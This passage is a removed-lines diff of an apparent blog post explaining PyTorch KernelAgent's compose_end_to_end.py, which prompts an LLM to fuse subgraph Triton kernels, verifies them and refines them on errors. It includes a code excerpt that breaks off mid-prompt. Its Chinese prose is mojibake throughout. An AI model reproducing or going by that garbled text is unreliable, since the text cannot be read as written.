-<li><strong>çº¦æä¿é</strong>ï¼éè¿ä¸¥æ ¼çä»£ç è§èï¼å¦å¿é¡»åå« <code>kernel_function</code>ãç¦æ­¢ PyTorch è®¡ç®é»è¾ï¼åæ°å¼æ ¡éªï¼ç¡®ä¿çæç Triton åæ ¸å¯ç¨ãæ­£ç¡®ã</li>
-</ul>
-<h3 id="12-æ ¸å¿ç¹è²">1.2 æ ¸å¿ç¹è²</h3>
-<table>
-<thead>
-<tr>
-<th style="text-align: center">ç¹è²æ¹å</th>
-<th style="text-align: center">å·ä½è¯´æ</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align: center"><strong>ä¸¥æ ¼çä»£ç çº¦æ</strong></td>
-<td style="text-align: center">å¼ºå¶è¦æ±çæçä»£ç åå« <code>kernel_function</code> é¡¶å±å½æ°ï¼ä¸åå§æ¨¡åè¾å¥ä¸è´ï¼ã@triton.jit åæ ¸ãèªæµå½æ°ï¼è¾åº PASS/0 éåºç ï¼ï¼ç¦æ­¢åæ ¸ä¸­ä½¿ç¨ PyTorch è®¡ç®é»è¾ï¼ä»åè®¸èªæµæ¶å¯¹æ¯ï¼ã</td>
-</tr>
-<tr>
-<td style="text-align: center"><strong>æºè½éè¯¯è¿­ä»£</strong></td>
-<td style="text-align: center">æè·ç¼è¯ / è¿è¡éè¯¯ï¼stderr/stdoutï¼ï¼æå»ºç²¾ç»å Prompt è®© LLM å®ä½å¹¶ä¿®æ­£é®é¢ï¼å¦ Triton å¸¸è§ç <code>tl.broadcast</code> è¯¯ç¨ï¼ã</td>
-</tr>
-<tr>
-<td style="text-align: center"><strong>èªå¨è¡¥ä¸ä¿®å¤</strong></td>
-<td style="text-align: center">åç½® Triton å¸¸è§é®é¢çææ¬è¡¥ä¸ï¼å¦æ¿æ¢ <code>tl.broadcast(0.0)</code> ä¸º 0.0ï¼ï¼åå°æ æä¹ç LLM è¿­ä»£ã</td>
-</tr>
-<tr>
-<td style="text-align: center"><strong>å®æ´çæ¥å¿çå­</strong></td>
-<td style="text-align: center">ä¿å­æ¯ä¸è½®ç Promptãçæçä»£ç ãéªè¯ç»æï¼ä¾¿äºè°è¯åè¿½æº¯çæè¿ç¨ã</td>
-</tr>
-<tr>
-<td style="text-align: center"><strong>æ°å¼ç­ä»·æ§ä¿é</strong></td>
-<td style="text-align: center">è¦æ±èªæµå½æ°ä½¿ç¨ <code>allclose</code> æ ¡éªæ°å¼ï¼fp32: rtolâ¤1e-3/atolâ¤1e-3ï¼fp16/bf16: â¤2e-2ï¼ï¼ç¡®ä¿ Triton å®ç°ä¸ PyTorch ç»æä¸è´ã</td>
-</tr>
-</tbody>
-</table>
-<h3 id="13-æµç¨å¾">1.3 æµç¨å¾</h3>
-<h4 id="æ ¸å¿é»è¾å³ç³»å¾">æ ¸å¿é»è¾å³ç³»å¾</h4>
-<p><img alt="compose_end_to_end.py.é»è¾å³ç³»å¾" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1850883/202603/1850883-20260312232646703-1988465569.png" class="lazyload"></p>
-<h4 id="å®æ´æ§è¡æµç¨å¾">å®æ´æ§è¡æµç¨å¾</h4>
-<p><img alt="compose_end_to_end.py.æµç¨å¾" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1850883/202603/1850883-20260312232654744-1457628230.png" class="lazyload"></p>
-<h2 id="0x02-è¯¦ç»åè½">0x02 è¯¦ç»åè½</h2>
-<h3 id="21-ä½¿ç¨">2.1 ä½¿ç¨</h3>
-<p>compose_end_to_end.py ä¼åæï¼composeï¼ä¸ä¸ªç«¯å°ç«¯ç Triton åæ ¸ï¼ç¨æ¥è§£å³åå§ KernelBench é®é¢ã</p>
-<p>compose_end_to_end.py ä¼å°åå§é®é¢æä»¶ãå­å¾åè§£ä¿¡æ¯ + åå¼ éå½¢ç¶ï¼æ¥èª <code>subgraphs.json</code>ï¼ãä»¥åå·²çæçå­å¾ Triton åæ ¸ä½ä¸ºè¾å¥ï¼æå»ºæç¤ºï¼promptï¼åéç» LLMãç¶åLLM ä¼æè¿äºç¢çæ¼æä¸ä¸ª<strong>è¯­ä¹ä¸åå§é®é¢å®å¨ä¸è´</strong>çå®æ´åæ ¸ï¼æç»è¿åä¸ä¸ª Python æä»¶ï¼<code>/composed_kernel.py</code>ï¼ï¼éé¢æä¾ï¼</p>
-<ul>
-<li>ä¸ä¸ªæå¤ä¸ªä½¿ç¨ <code>@triton.jit</code> è£é¥°ç Triton åæ ¸ã</li>
-<li>ä¸ä¸ªåä¸º <code>kernel_function(...)</code> çé¡¶å± Python åè£å½æ°ï¼å®æ¥åä¸åå§æ¨¡åç¸åçè¾å¥å¼ éï¼å¹¶åè° Triton åæ ¸çæ§è¡ï¼è¿åæç»è¾åºã</li>
-<li>ä¸ä¸ªèªæµå½æ°ï¼å¦ <code>test_kernel</code> æ <code>run_tests</code>ï¼ï¼è¯¥å½æ°æ¯è¾ Triton å®ç°çç»æä¸åå§ PyTorch é®é¢ä»£ç çåèç»æï¼å¹¶å¨æåæ¶æå° <code>'PASS'</code> å¹¶éåºã</li>
-<li>çæè¿ç¨çåæ°æ®åéªè¯ç»æä¼è¢«è®°å½å¨ä¸ä¸ª JSON æ ¼å¼çæè¦æä»¶ä¸­ï¼å¦ <code>composition_summary.json</code>ï¼ã</li>
-</ul>
-<p>compose_end_to_end.py ç¨æ³å¦ä¸ï¼</p>
-<pre><code class="language-bash">python -m Fuser.compose_end_to_end \
-    --problem /abs/path/to/kernelbench_problem.py \
-    --subgraphs /abs/path/to/subgraphs.json \
-    --kernels-summary /abs/path/to/kernels_out/summary.json \
-    [--model gpt-5] \
-    [--out-dir ./compose_out] \
-    [--verify]
-</code></pre>
-<p>å¯ä»¥éè¿ <code>--verify</code> æ å¿å¯ç¨èªå¨éªè¯ãå¨æ­¤æ¨¡å¼ä¸ï¼æ¯ä¸ª LLM çæçç»åå°è¯ï¼æ è®ºæ¯åå§çè¿æ¯ç»è¿ä¿®æ­£çï¼é½ä¼è¢«ä¼ éç» Fuser/runner.py ä¸­ç <code>run_candidate</code> å½æ°æ¥æ§è¡ã</p>
-<p>éªè¯çæåä¸å¦åå³äºæ§è¡æ¯å¦æ­£å¸¸éåºï¼exit code 0ï¼å¹¶ä¸è¾åºä¸­åå« <code>'PASS'</code> å­ç¬¦ä¸²æ <code>ALL_TESTS_PASSED</code> å­ç¬¦ä¸²ã</p>
-<p><img alt="compose_end_to_end_new" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1850883/202603/1850883-20260312232705593-1504930607.png" class="lazyload"></p>
-<h3 id="22-éè¯¯å¤çä¸è¿­ä»£">2.2 éè¯¯å¤çä¸è¿­ä»£</h3>
-<p>å¦æ LLM çæçç¬¬ä¸ä¸ªç»ååæ ¸æ æ³éè¿éªè¯ï¼è¿è¡ / ç¼è¯å¤±è´¥ï¼ï¼è¯¥èæ¬ä¼æè·éè¯¯ä¿¡æ¯ï¼<code>stderr</code>ï¼<code>stdout</code>ï¼ãå®ä¼æå»ºä¸ä¸ªæ°çæç¤ºï¼<code>_build_refinement_prompt</code>ï¼ï¼å°éè¯¯ä¿¡æ¯ä½ä¸ºä¸ä¸ææä¾ç» LLMï¼è¦æ±å¶ä¿®æ­£ä»£ç ãè¿ä¸ªè¿ç¨å¯ä»¥éå¤å¤æ¬¡ï¼<code>max_iters</code> åæ°æ§å¶æå¤§è¿­ä»£æ¬¡æ°ï¼ï¼ç´å°çæçåæ ¸éè¿éªè¯æè¾¾å°æå¤§è¿­ä»£æ¬¡æ°ã</p>
-<h3 id="23-_load_kernels_from_summary">2.3 _load_kernels_from_summary</h3>
-<p><code>_load_kernels_from_summary</code> ä¸ºæå»º prompt æä¾ <strong>ãä»£ç ç´ æã</strong>ï¼åå­å¾çææ Triton åæ ¸ä»£ç ï¼ï¼å·ä½èè¨ï¼_load_kernels_from_summaryä»è°åº¦é¶æ®µçæçåæ ¸æ±æ» JSON æä»¶ä¸­ï¼è¿æ»¤å¹¶å è½½æææåçæçææå­å¾ Triton åæ ¸ï¼æ ¡éªæ°æ®æ ¼å¼ä¸æä»¶æææ§ï¼å°è£ä¸ºæ åå KernelItem å¯¹è±¡åè¡¨ï¼ä¸º LLM ç»ååæ ¸æä¾å¯ç´æ¥å¤ç¨çææä»£ç ç´ æï¼è¿æ»¤å¤±è´¥ãæ æçåæ ¸äº§ç©ï¼é¿åæ æç´ æå¹²æ°åç»­ç»åæµç¨ã</p>
-<p>å¶ç¹æ®å¦ä¸ï¼</p>
-<ul>
-<li>
-<p><strong>å¤ç»´åº¦ææåæ ¸è¿æ»¤</strong>ï¼ä¾æ¬¡è¿æ»¤ãéåè¡¨æ ¼å¼æ±æ»æ°æ®ãéå­å¸æ ¼å¼å­é¡¹ãæ è®°ä¸ºå¤±è´¥çåæ ¸ãæ  ID / æ åæ ¸è·¯å¾çå­é¡¹ãåæ ¸æä»¶ä¸å­å¨çå­é¡¹ãï¼ä»ä¿çå¨éæ ¡éªéè¿çæååæ ¸ï¼ä»æºå¤´ä¿è¯ä»£ç ç´ æçæææ§ï¼</p>
-</li>
-<li>
-<p><strong>å³é®å­æ®µå¼ºå¶æ ¡éª</strong>ï¼å­å¾ IDï¼sidï¼ååæ ¸æä»¶è·¯å¾ï¼kernel_pathï¼ä¸ºå¿éå­æ®µï¼ç¼ºå¤±ä»»ä¸åç´æ¥è¿æ»¤ï¼ç¡®ä¿æ¯ä¸ªææåæ ¸é½è½å³èå°å¯ä¸å­å¾ä¸å­å¨å®éä»£ç æä»¶ï¼</p>
-</li>
-<li>
-<p><strong>æ ååå¯¹è±¡å°è£</strong>ï¼å°åæ ¸çå­å¾ IDãæä»¶è·¯å¾ãä»£ç åå®¹å°è£ä¸º KernelItem å¯¹è±¡ï¼èéåå§å­å¸ / å­ç¬¦ä¸²ï¼æååç»­ä»£ç å¤ççå¯è¯»æ§ä¸å¯ç»´æ¤æ§ï¼</p>
-</li>
-<li>
-<p><strong>æ ææåæ ¸ç´æ¥ç»æ­¢</strong>ï¼è¥æ±æ»æä»¶ä¸­æ ä»»ä½ææåæ ¸ï¼ç´æ¥æåº SystemExit å¼å¸¸ç»æ­¢æµç¨ï¼é¿ååç»­æµç¨å æ ææç´ æèæ æä¹æ§è¡ï¼</p>
-</li>
-<li>
-<p><strong>å¼å®¹è°åº¦é¶æ®µè¾åºæ ¼å¼</strong>ï¼ä¸¥æ ¼éé dispatch æ­¥éª¤çæç summary.json æ ¼å¼ï¼å®ç°ä¸ä¸æ¸¸æµç¨çæ ç¼è¡æ¥ã</p>
-</li>
-</ul>
-<h3 id="24-prompt">2.4 Prompt</h3>
-<p>ä»¥ä¸ä¸ä¸ªå½æ°æ¯ PyTorch KernelAgent ä¸­<strong>LLM çæç«¯å°ç«¯ Triton åæ ¸ç Prompt æå»ºæ ¸å¿æ¨¡å</strong>ï¼ä¸º LLM æä¾<strong>æ ååãé«æå¯¼æ§ãåºæ¯ééçç²¾åè¾å¥æç¤º</strong>ï¼æ¯è¿æ¥ãåæ£çå­å¾ / åæ ¸ / é®é¢æ°æ®ãä¸ãLLM å¯çè§£ççææä»¤ãçå³é®æ¢çº½ãå¶ä¸­</p>
-<ul>
-<li><code>_summarize_subgraphs_for_prompt</code> ä¸ºåºç¡æ°æ®å¤çå½æ°ï¼è´è´£å°å­å¾ä¿¡æ¯æ ¼å¼åï¼</li>
-<li><code>_build_composition_prompt</code> å <code>_build_refinement_prompt</code> ä¸ºå Prompt æå»ºä¸»å½æ°ï¼åå«æ¯æ<strong>é¦æ¬¡ç«¯å°ç«¯åæ ¸ç»åçæ</strong>å<strong>åºäºéè¯¯çè¿­ä»£ç²¾ä¿®</strong>ä¸¤å¤§æ ¸å¿åºæ¯ï¼éè¿ä¸¥æ ¼çæä»¤çº¦æãå®æ´çä¸ä¸æä¿¡æ¯ãéå¯¹æ§çä¼åæå¯¼ï¼ç¡®ä¿ LLM çæç¬¦åå·¥ç¨è¦æ±ãç¡¬ä»¶ééãå¯ç´æ¥è¿è¡ç Triton åæ ¸ä»£ç ã</li>
-</ul>
-<h4 id="æ ¸å¿ä½ç¨">æ ¸å¿ä½ç¨</h4>
-<ol>
-<li><strong>_summarize_subgraphs_for_prompt</strong>ï¼ä½ä¸ºåºç¡æ¯æå½æ°ï¼å°æ¨¡ååè§£åçå­å¾ä¿¡æ¯åè¡¨<strong>ç»æåãç®æ´åè½¬æ¢ä¸ºææ¬æè¦</strong>ï¼æåå­å¾ IDãç±»åãæ°æ®å¸å±ãæ°æ®ç±»åãè¾å¥è¾åºå½¢ç¶ãæ ¸å¿ç®å­ç­å³é®çº¦æä¿¡æ¯ï¼æç»ä¸æ ¼å¼æ¼æ¥ä¸ºæè¯»å­ç¬¦ä¸²ï¼ä¸ºä¸¤ä¸ª Prompt æå»ºå½æ°æä¾æ ååçå­å¾ä¿¡æ¯æè¿°ï¼è®© LLM å¿«éçè§£åå­å¾çåè½ä¸è®¡ç®çº¦æã</li>
-<li><strong>_build_composition_prompt</strong>ï¼ä¸º LLM é¦æ¬¡çææå»º<strong>å¨éä¸ä¸æãå¼ºçº¦æçç»åå Prompt</strong>ï¼æ´ååå§ PyTorch é®é¢ä»£ç ãå­å¾ä¿¡æ¯æè¦ãåå­å¾ææ Triton åæ ¸ä»£ç ãç®æ ç¡¬ä»¶å¹³å°éç½®åå¤§æ ¸å¿ä¿¡æ¯ï¼æç¡® LLM çæ ¸å¿ä»»å¡æ¯èåå­å¾åæ ¸çæç«¯å°ç«¯ Triton å®ç°ï¼å¹¶å¶å®ä¸¥æ ¼çå·¥ç¨è¦æ±ãç¡¬ä»¶ééè§åãTriton å¼åè§èï¼æå¯¼ LLM å®æä»ãåæ£å­å¾ãå°ãä¸ä½ååæ ¸ãçç»åä¸ä¼åã</li>
-<li><strong>_build_refinement_prompt</strong>ï¼ä¸º LLM è¿­ä»£ä¼åæå»º<strong>éè¯¯å¯¼åãéå¯¹æ§çç²¾ä¿®å Prompt</strong>ï¼å¨ä¿çæ ¸å¿åºç¡ä¿¡æ¯çåæä¸ï¼æ°å¢åæ¬¡çæçéè¯¯æ¥å¿ï¼stdout/stderrï¼ãä¸ä¸è½®å¤±è´¥çä»£ç å®ç°ï¼æç¡® LLM çæ ¸å¿ä»»å¡æ¯åºäºéè¯¯ä¿¡æ¯å®ä½é®é¢å¹¶ä¿®æ­£ä»£ç ï¼åæ¶è¿½å æ´å·ä½çéè¯¯ä¿®å¤è¦æ±ï¼ç¡®ä¿ç²¾ä¿®åçä»£ç è½è§£å³ç¼è¯ / è¿è¡é®é¢ï¼ä¸ä¸è¿èåæå·¥ç¨è§èã</li>
-</ol>
-<h4 id="_build_composition_prompt-ä¸å±ç¹è²">_build_composition_prompt ä¸å±ç¹è²</h4>
-<ol>
-<li><strong>åå¤§æ ¸å¿ä¿¡æ¯å¨éæ´å</strong>ï¼å®æ´èå¥ãåå§é®é¢ä»£ç ï¼éæ±åºåï¼ãå­å¾æè¦ï¼é»è¾çº¦æï¼ãå­å¾åæ ¸ï¼ä»£ç ç´ æï¼ãå¹³å°éç½®ï¼ç¡¬ä»¶è§åï¼ãï¼è®© LLM æ¢çè§£ãè¦åä»ä¹ï¼PyTorch æ¨¡ååè½ï¼ãï¼åç¥éãæä»ä¹å¯ç¨ï¼å­å¾åæ ¸ï¼ãï¼è¿æç¡®ãè¯¥æä¹ééï¼ç¡¬ä»¶å¹³å°ï¼ãï¼</li>
-<li><strong>æ ¸å¿çå¿µæç¡®ï¼èåä¸èå</strong>ï¼æç¡®è¦æ± LLM ä¼åå°å¤å­å¾èåä¸ºå°½å¯è½å°ç Triton åæ ¸å¯å¨ï¼å¨ä¿è¯æ°å¼è¯­ä¹åç¡®çåæä¸æåè¿è¡æçï¼è´´å Triton åæ ¸ãå¤§ç²åº¦èåãåå°åæ ¸å¯å¨å¼éãçä¼åæ ¸å¿çå¿µï¼</li>
-<li><strong>è¶è¯¦ç»çç¡¬æ§è¦æ±</strong>ï¼å¶å® 10 ä½é¡¹ä¸å¯è¿èçç¡¬è§åï¼è¦çä»£ç è¾åºæ ¼å¼ãè®¾å¤å¼ éç®¡çãå½æ°å½åä¸å°è£ãè®¡ç®æ¥å£éå¶ï¼ç¦ç¨ PyTorch è®¡ç®ï¼ãæ°æ®æ ¼å¼ä¸ç®å­é¡ºåºãæ°å¼éªè¯è¦æ±ãå¯¼å¥ä¸è¡ä¸ºéå¶ç­ï¼ä»æºå¤´è§èä»£ç çæï¼</li>
-<li><strong>å®ç¨ç Triton å¼åæå¯¼</strong>ï¼æä¾éå¯¹æ§ç Triton å®ç°æå·§ï¼åæ¬å­å¾èåçå½¢ç¶å¹éãå¸¸éæéä¼åãåå­è®¿é®è§èï¼tl.load/tl.store å¸¦æ©ç ï¼ãç½æ ¼ä¸ååè®¾è®¡ï¼åæ¶æç¡®ååº Triton å¸¸è§å¼åé·é±åè§é¿æ¹æ³ï¼éä½ LLM çæéè¯¯ä»£ç çæ¦çï¼</li>
-<li><strong>æ°å¼ç­ä»·æ§å¼ºå¶è¦æ±</strong>ï¼æç¡®è¦æ±çæçä»£ç å¿é¡»åå«èªæµè¯å½æ°ï¼éè¿ä¸ PyTorch åèç»æçå¯¹æ¯éªè¯æ°å¼æ­£ç¡®æ§ï¼å¹¶å¶å®ä¸¥æ ¼çè¯¯å·®å®¹å¿åº¦ï¼fp32/_fp16/bf16 åºåï¼ï¼ç¡®ä¿ Triton åæ ¸çåè½æ­£ç¡®æ§ä¸æ°å¼åç¡®æ§ã</li>
-</ol>
-<h4 id="_build_refinement_prompt-ä¸å±ç¹è²">_build_refinement_prompt ä¸å±ç¹è²</h4>
-<ol>
-<li><strong>éè¯¯å¯¼åçç²¾åç²¾ä¿®</strong>ï¼å°åæ¬¡çæç stderr/stdout éè¯¯æ¥å¿ä½ä¸ºæ ¸å¿åèï¼è®© LLM èç¦äºãå®ä½é®é¢âä¿®å¤é®é¢ãï¼é¿åæ ç®ççéçæï¼å¤§å¹æåè¿­ä»£ä¼åçæçä¸éå¯¹æ§ï¼</li>
-<li><strong>ä¿çåæçº¦æï¼è¿½å ä¿®å¤è¦æ±</strong>ï¼æç¡®ãåæææè¦æ±ä¿æä¸åãï¼ä»éå¯¹éè¯¯åºæ¯è¿½å æ´å·ä½çä¿®å¤è§åï¼å¦ç¦æ­¢ tl.broadcast æ»¥ç¨æ éï¼ï¼ç¡®ä¿ç²¾ä¿®åçä»£ç ä¸è¿èåæå·¥ç¨è§èï¼åæ¶è§£å³å·ä½é®é¢ï¼</li>
-<li><strong>å¨éä»£ç éçæï¼æç»å·®åè¾åº</strong>ï¼å¼ºå¶è¦æ± LLM è¿åå®æ´çä¿®æ­£åä»£ç ï¼èéä»£ç å·®åæä¿®æ¹å»ºè®®ï¼é¿ååç»­ä»£ç æ¼æ¥ãæ´åçé¢å¤å·¥ä½ï¼ç¡®ä¿è¾åºå¯ç´æ¥æ¿æ¢ä½¿ç¨ï¼</li>
-<li><strong>å³é®æ è¯å¼ºå¶ä¿ç</strong>ï¼æç¡®è¦æ±ä¿çé¡¶å± <code>kernel_function</code> å½æ°åãèªæµè¯å½æ°åãPASSãæå° / éåºç è§åï¼ç¡®ä¿ç²¾ä¿®åçä»£ç è½æ ç¼å¯¹æ¥åç»­çèªå¨åéªè¯æµç¨ï¼æ éä¿®æ¹éªè¯é»è¾ï¼</li>
-<li><strong>å¤±è´¥ä»£ç åèï¼å®ä½é®é¢æ´é«æ</strong>ï¼å°ä¸ä¸è½®çå¤±è´¥ä»£ç å®æ´èå¥ Promptï¼è®© LLM è½ç´æ¥å¯¹æ¯éè¯¯æ¥å¿ä¸ä»£ç å®ç°ï¼å¿«éå®ä½é®é¢æå¨ï¼å¦ç¼è¯éè¯¯çè¡å·ãè¿è¡éè¯¯çé»è¾ï¼ï¼æåä¿®å¤çåç¡®æ§ã</li>
-</ol>
-<h4 id="_summarize_subgraphs_for_prompt-ä¸å±ç¹è²">_summarize_subgraphs_for_prompt ä¸å±ç¹è²</h4>
-<p><code>_summarize_subgraphs_for_prompt</code> æä¾ <strong>ãé»è¾çº¦æã</strong>ï¼åå­å¾çåè½ãå½¢ç¶ãå¸å±ç­çº¦æä¿¡æ¯ï¼ãå·ä½èè¨ï¼_summarize_subgraphs_for_promptï¼å¯¹æ¨¡ååè§£åçå­å¾ä¿¡æ¯åè¡¨è¿è¡<strong>ç»æåãç®æ´åçææ¬æ±æ»</strong>ï¼æåå­å¾ IDãç±»åãæ°æ®å¸å±ãæ°æ®ç±»åãè¾å¥è¾åºå½¢ç¶ãæ ¸å¿ç®å­ç­å³é®ä¿¡æ¯ï¼æç»ä¸æ ¼å¼æ¼æ¥ä¸ºæè¯»çææ¬å­ç¬¦ä¸²ï¼ä¸ºæå»º LLM ç»å Prompt æä¾æ ååçå­å¾ä¿¡æ¯æè¿°ï¼è®© LLM å¿«éçè§£åå­å¾çåè½ãå½¢ç¶çº¦æä¸è®¡ç®è¦æ±ã</p>
-<ol>
-<li><strong>å³é®ä¿¡æ¯ç²¾åæåï¼åé¤åä½</strong>ï¼ä»ä¿ç LLM ç»å / ç²¾ä¿®åæ ¸æéçæ ¸å¿çº¦æä¿¡æ¯ï¼IDãç±»åãå¸å±ãdtypeãè¾å¥è¾åºå½¢ç¶ãæ ¸å¿ç®å­ï¼ï¼åé¤æ å³åä½ä¿¡æ¯ï¼åå° Prompt ç Token å ç¨ï¼æå LLM å¤çæçï¼</li>
-<li><strong>åçé»è®¤å¼ååºï¼ä¿è¯é²æ£æ§</strong>ï¼å¯¹æ°æ®å¸å±ï¼é»è®¤ NCHWï¼ãæ°æ®ç±»åï¼é»è®¤ float32ï¼ãç®å­åè¡¨ï¼é»è®¤ç©ºåè¡¨ï¼ç­æç¼ºå¤±å­æ®µè®¾ç½®åçé»è®¤å¼ï¼é¿åå å­æ®µç¼ºå¤±å¯¼è´ Prompt æå»ºå¤±è´¥ï¼æåæµç¨çå®¹éæ§ï¼</li>
-<li><strong>å±çº§åç´§åæ ¼å¼ï¼æè¯»æè§£æ</strong>ï¼éç¨ãä¸çº§è¡æ æ³¨å­å¾åºç¡å±æ§ + äºçº§è¡æ æ³¨æ ¸å¿ç®å­ãçå±çº§æ ¼å¼ï¼æ¢ä¿è¯ä¿¡æ¯ç´§åï¼éé Prompt é¿åº¦éå¶ï¼ï¼åç»ææ¸æ°ï¼è®© LLM è½å¿«éå³èå­å¾ ID ä¸å¯¹åºçåè½ãçº¦æï¼</li>
-<li><strong>ç®å­ä¿¡æ¯é¿åº¦æ§å¶ï¼é¿åè¶é</strong>ï¼å°ç®å­åè¡¨åºåååæªåå 400 å­ç¬¦ï¼é¿åå ç®å­è¿å¤å¯¼è´ Prompt è¿é¿è¶åº LLM ä¸ä¸æçªå£ï¼åæ¶å¼å®¹ JSON åºååå¤±è´¥çæåµï¼éçº§ä¸ºç´æ¥å­ç¬¦ä¸²æªåï¼ï¼ä¿è¯ä¿¡æ¯å®æ´æ§ï¼</li>
-<li><strong>å½¢ç¶ä¿¡æ¯çµæ´»éé</strong>ï¼ä¼åä½¿ç¨ <code>inputs</code> å­æ®µæè¿°è¾å¥ï¼æ  <code>inputs</code> åéçº§ä¸º <code>input_shape</code>ï¼ééä¸åå­å¾åè§£å·¥å·çè¾åºæ ¼å¼å·®å¼ï¼ä¿è¯è¾å¥è¾åºå½¢ç¶ä¿¡æ¯çææä¼ éã</li>
-</ol>
-<h4 id="ååå·¥ä½å³ç³»">ååå·¥ä½å³ç³»</h4>
-<p>ä¸ä¸ªå½æ°å½¢æ <strong>ãåºç¡æ°æ®å¤çâé¦æ¬¡çæ Prompt æå»ºâè¿­ä»£ç²¾ä¿® Prompt æå»ºã</strong> çå±çº§æ¯æå³ç³»ï¼ä¸º LLM çæç«¯å°ç«¯ Triton åæ ¸æä¾å¨æµç¨ç Prompt æ¯æï¼</p>
-<ol>
-<li><strong>åºç¡å±</strong>ï¼<code>_summarize_subgraphs_for_prompt</code> å¯¹åå§å­å¾ä¿¡æ¯åç»ä¸æ ¼å¼åå¤çï¼çææ ååå­å¾æè¦ï¼ä¸ºä¸å±ä¸¤ä¸ª Prompt æå»ºå½æ°æä¾ä¸è´ãæè§£æçå­å¾çº¦æä¿¡æ¯ï¼å®ç°æ°æ®çä¸æ¬¡å¤çãå¤æ¬¡å¤ç¨ï¼</li>
-<li><strong>é¦æ¬¡çæå±</strong>ï¼<code>_build_composition_prompt</code> åºäºæ ååå­å¾æè¦ï¼æ´åé®é¢ä»£ç ãå­å¾åæ ¸ãå¹³å°éç½®ï¼æå»ºå¨éçº¦æçç»å Promptï¼æå¯¼ LLM å®æé¦æ¬¡ç«¯å°ç«¯ Triton åæ ¸çæï¼æ¯ãä»æ å°æãçæ ¸å¿æå¯¼ï¼</li>
-<li><strong>è¿­ä»£ç²¾ä¿®å±</strong>ï¼<code>_build_refinement_prompt</code> å¤ç¨æ ååå­å¾æè¦ä¸æ ¸å¿åºç¡ä¿¡æ¯ï¼æ°å¢éè¯¯æ¥å¿ååæ¬¡å¤±è´¥ä»£ç ï¼æå»ºéè¯¯å¯¼åçç²¾ä¿® Promptï¼æå¯¼ LLM å®æãä»éå°å¯¹ãçè¿­ä»£ä¼åï¼æ¯æåä»£ç æææ§çå³é®ï¼</li>
-<li><strong>é­ç¯æ¯æ</strong>ï¼ä¸ä¸ªå½æ°çè¾åºå±åæ¯æ KernelAgent çãçæâéªè¯âç²¾ä¿®âåéªè¯ãé­ç¯æµç¨ï¼ç¡®ä¿æ¯ä¸è½® LLM çæé½ææç¡®çæå¯¼ãåè¶³çä¾æ®ãä¸¥æ ¼ççº¦æï¼å¤§å¹æåç«¯å°ç«¯ Triton åæ ¸ççææåçä¸å·¥ç¨è´¨éã</li>
-</ol>
-<h4 id="ä»£ç ">ä»£ç </h4>
-<pre><code class="language-python">def _build_composition_prompt(
-    problem_code: str,
-    subgraphs: list[dict[str, Any]],
-    kernel_items: list[KernelItem],
-    target_platform: PlatformConfig,
-) -&gt; str:
-    """Create a single user message to instruct composition by the LLM.
-    æå»ºåå§åæPromptï¼
-    ä¸ºLLMçæç»æåæä»¤ï¼å¼å¯¼å¶åºäºå­å¾ååèåæ ¸ï¼åæç«¯å°ç«¯çTritonç®å­ä»£ç 
-    åæ°ï¼
-    - problem_code: åå§KernelBenché®é¢ä»£ç ï¼PyTorchï¼
-    - subgraphs: å­å¾ä¿¡æ¯åè¡¨ï¼JSONæ ¼å¼ï¼
-    - kernel_items: åèåæ ¸åè¡¨ï¼åå«å­å¾IDåå¯¹åºçTritonä»£ç ï¼
-    - target_platform: ç®æ å¹³å°éç½®ï¼å¦CUDA/XPUï¼
-    è¿åå¼ï¼å®æ´çLLMç¨æ·æä»¤å­ç¬¦ä¸²
-    """
-    # ç¬¬ä¸æ­¥ï¼çæå­å¾æè¦ï¼åç¼©å­å¾ä¿¡æ¯ï¼æ§å¶Tokenæ¶èï¼ä¾¿äºLLMå¿«éçè§£æ ¸å¿ç¹å¾ï¼
-    sg_summary = _summarize_subgraphs_for_prompt(subgraphs)
-
-    # ç¬¬äºæ­¥ï¼æå»ºåèåæ ¸ä»£ç åºåï¼ä»ä¿çæ ¸å¿ä»£ç ï¼é¿åTokenæº¢åºï¼
-    # æ³¨éè¯´æï¼ææ¶ä¿çå®æ´æä»¶åå®¹ï¼è°ç¨æ¹å¯æ ¹æ®æ¨¡åçªå£éå¶è¿ä¸æ­¥è£åª
-    # åå§ååæ ¸åºåçææ¬çæ®µåè¡¨
-    kernels_section_parts: list[str] = []
-    # éåæ¯ä¸ªåèåæ ¸é¡¹
-    for ki in kernel_items:
-        # ä¸ºæ¯ä¸ªå­å¾åæ ¸æå»ºå¸¦æ ¼å¼çä»£ç çæ®µï¼Markdown Pythonä»£ç åï¼
-        kernels_section_parts.append(
-            f"### Subgraph {ki.subgraph_id}\n```python\n" + ki.code + "\n```\n"
-        )
-    # æ¼æ¥ææåæ ¸çæ®µï¼å½¢æå®æ´çåèåæ ¸åºå
-    kernels_section = "\n".join(kernels_section_parts)
-    
-    # ç¬¬ä¸æ­¥ï¼è·åå¹³å°ä¸å±çæå¯¼è§åï¼å¦CUDAçåå­è®¿é®è§åãXPUçç¼è¯è¦æ±ï¼
-    platform_guidance = target_platform.guidance_block
-
-    # ç¬¬åæ­¥ï¼æå»ºæ ¸å¿æå¯¼è¯­ï¼åå«ä»»å¡èæ¯ãå¹³å°ä¿¡æ¯ãç¡¬æ§è¦æ±ãå®ç°æå·§ï¼
-    # ä½¿ç¨textwrap.dedentå»é¤ç¼©è¿ï¼ä¿è¯Promptæ ¼å¼æ´æ´
-    guidance = textwrap.dedent(
-        f"""
-        You are given:
-        - The original problem file (PyTorch module and helpers).
-        - A decomposition of the model into fusable subgraphs with exact shapes.
-        - Working Triton kernels generated for some subgraphs.
-
-        TARGET PLATFORM: {target_platform.name}
-        DEVICE STRING: {target_platform.device_string}
-        {platform_guidance}
-
-        Task:
-        - Compose an end-to-end Triton implementation that matches the original
-          model's forward pass for the provided shapes. You may inline, adapt,
-          or reuse the given subgraph kernels. Prefer fusing into as few kernel
-          launches as possible while preserving exact numerical semantics.
-
-        Hard requirements:
-        - Return ONE complete Python file only, fenced as a single ```python block.
-        - Allocate inputs, weights, intermediates, and outputs on device='{target_platform.device_string}' and keep them there throughout forward/verification.
-        - CPU is acceptable only for metadata, scalars, and export serializationâavoid `.cpu()` or `.to('cpu')` on compute tensors.
-        - Provide at least one @triton.jit kernel and a top-level Python wrapper
-          named kernel_function(...). This wrapper must accept the same primary
-          input tensor(s) as the model and any required weights/biases with shapes
-          implied by the problem; it should orchestrate Triton kernel(s) and
-          return the final output tensor.
-        - No PyTorch math path: kernel_function MUST compute the final outputs
